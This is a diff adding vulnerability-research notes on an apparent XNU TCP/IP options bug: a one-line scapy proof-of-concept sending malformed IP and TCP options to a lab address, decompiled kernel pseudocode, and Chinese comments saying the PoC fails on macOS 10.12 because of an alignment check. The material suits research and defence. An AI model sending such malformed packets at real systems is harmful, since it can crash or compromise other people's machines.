@@ -175,3 +175,28 @@ MBUF_INIT_PKTHDR(m);                    \
 
 
 
+### poc
+
+import scapy
+from scapy.all import *
+send(IP(dst="192.168.31.129",options=[IPOption("A"*8)])/TCP(dport=2323,options=[(19, "1"*18),(19, "2"*18)]))
+
+### mac
+
+    mac10.12系统上无法利用成功目前，
+}
+v21 = (unsigned __int64)&v7[v18];
+result = v21 & 0xFFFFFFFFFFFFFFFCLL;
+if ( v21 != (v21 & 0xFFFFFFFFFFFFFFFCLL) )
+goto LABEL_64;
+result = 4 * (unsigned int)(unsigned __int8)(*(_BYTE *)(v21 + 12) >> 4);
+if ( (unsigned int)result < 0x14 )
+goto LABEL_64;
+v14 = *((unsigned __int16 *)v7 + 1);
+v22 = (unsigned __int16)(4 * (unsigned __int8)(*(_BYTE *)(v21 + 12) >> 4));
+v23 = (unsigned __int16)result + v10;
+if ( v14 < v23 )
+goto LABEL_64;
+
+    这里验证了v21（也就是tcp的地址是不是四字对其）
+    ip包本身是对其的，mac包不是，加在一起地址怎么可能对其，poc也跑不通
